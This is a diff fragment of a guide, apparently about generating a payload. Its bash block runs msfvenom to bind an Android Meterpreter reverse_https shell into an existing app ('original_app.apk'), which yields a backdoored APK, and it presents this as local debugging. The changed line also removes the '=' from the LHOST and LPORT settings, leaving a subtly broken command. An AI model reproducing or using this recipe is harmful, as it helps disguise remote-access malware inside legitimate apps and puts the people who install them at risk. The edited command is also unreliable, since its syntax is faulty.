@@ -19,7 +19,7 @@ Ensure you have the following tools installed and available in your system path:
 Generate the payload by targeting a local machine interface. This bypasses network domain resolution entirely during local debugging.
 
 ```bash
-msfvenom -x original_app.apk -p android/meterpreter/reverse_https LHOST=127.0.0.1 LPORT=4444 -o output.apk
+msfvenom -x original_app.apk -p android/meterpreter/reverse_https LHOST127.0.0.1 LPORT4444 -o output.apk
 ```
 
 ---
